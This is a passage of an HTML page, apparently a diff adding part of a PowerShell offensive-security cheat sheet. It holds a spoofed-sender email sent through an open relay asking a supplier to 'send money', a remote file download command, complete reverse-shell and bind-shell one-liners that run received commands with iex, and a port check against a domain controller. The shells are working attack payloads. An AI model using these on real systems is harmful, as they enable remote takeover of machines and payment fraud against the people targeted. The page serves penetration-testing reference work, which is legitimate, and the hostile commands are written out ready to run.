+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">Send-MailMessage</span> <span class="n">-From</span> <span class="s1">&#39;Not John Do &lt;finance@offsec.nl&gt;&#39;</span> <span class="n">-To</span> <span class="s1">&#39;supplier@offsec.nl&#39;</span> <span class="n">-Subject</span> <span class="s1">&#39;Please send money&#39;</span> <span class="n">-SmtpServer</span> <span class="s1">&#39;openrelay.offsec.nl&#39;</span>
+</code></pre></div>
+<h5 id="download-a-file-from-a-remote-resource">Download a file from a remote resource</h5>
+<p>When ran from cmd.exe add powershell -c "<command>"</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="p">(</span><span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;https://www.7-zip.org/a/7z2201-x64.exe&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Users\crypt0rr\Desktop\7z2201-x64.exe&#39;</span><span class="p">)</span>
+</code></pre></div>
+<h2 id="shells-reversebind">Shells (reverse/bind)</h2>
+<h5 id="reverse-shell">Reverse shell</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;TARGET-IP-HERE&gt;&#39;,&lt;TARGET-PORT-HERE&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</span>
+</code></pre></div>
+<h5 id="bind-shell">Bind shell</h5>
+<p>0.0.0.0 - will bind to every IP-address available on the local system</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">&quot;$listener = New-Object System.Net.Sockets.TcpListener(&#39;0.0.0.0&#39;,&lt;TARGET-PORT-HERE&gt;);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()&quot;</span>
+</code></pre></div>
+<h2 id="port-scan">Port Scan</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">Test-NetConnection</span> <span class="n">DC01</span><span class="p">.</span><span class="n">offsec</span><span class="p">.</span><span class="n">nl</span> <span class="n">-port</span> <span class="n">389</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">ComputerName</span> <span class="p">:</span> <span class="n">DC01</span><span class="p">.</span><span class="n">offsec</span><span class="p">.</span><span class="n">nl</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="n">RemoteAddress</span> <span class="p">:</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="n">RemotePort</span> <span class="p">:</span> <span class="n">389</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="n">InterfaceAlias</span> <span class="p">:</span> <span class="n">Ethernet</span>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="n">SourceAddress</span> <span class="p">:</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">4</span>
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="n">TcpTestSucceeded</span> <span class="p">:</span> <span class="n">True</span>
+</code></pre></div></p>
+    </article>
+</section>
+            <!-- endblock -->
+
+            <!-- block footer -->
+                <footer>
+    <div class="d-flex flex-sm-row justify-content-between py-2 border-top drac-text-black drac-bg-cyan-green">
+        <a href="https://github.com/dracula/mkdocs" target="_blank" style="padding-left: 1%;"
+            class="footer-text drac-anchor drac-text-black drac-text-purple--hover">
+            Made with Dracula Theme for MkDocs
+        </a>
+    </div>
+</footer>
+            <!-- endblock -->
+        </div>
+
+    </main>
+
+        <script>var base_url = '../..';</script>
+        <script src="../../assets/js/jquery-3.3.1.slim.min.js"></script>
+        <script src="../../assets/js/bootstrap.bundle.min.js"></script>
+        <script src="../../assets/js/mkdocs.js"></script>
+			<script src="../../search/main.js" defer></script>
+
+<script>const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});</script></body>
+
+</html>
